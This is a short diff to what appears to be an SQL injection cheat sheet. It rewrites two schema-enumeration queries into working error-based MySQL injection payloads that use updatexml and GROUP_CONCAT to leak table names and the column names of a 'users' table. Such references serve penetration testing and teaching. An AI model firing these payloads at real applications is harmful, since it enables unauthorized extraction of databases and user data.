@@ -116,13 +116,11 @@ GROUP_CONCAT (all at once)
 
 Tables:
 
-SELECT GROUP_CONCAT(table_name) FROM information_schema.tables
+' AND updatexml(1,concat('~',(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='database_name'),'~'),1)-- -
 
 Columns:
 
-SELECT GROUP_CONCAT(column_name)
-FROM information_schema.columns
-WHERE table_name='users'
+' AND updatexml(1,concat('~',(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),'~'),1)-- -
 
 ---
 
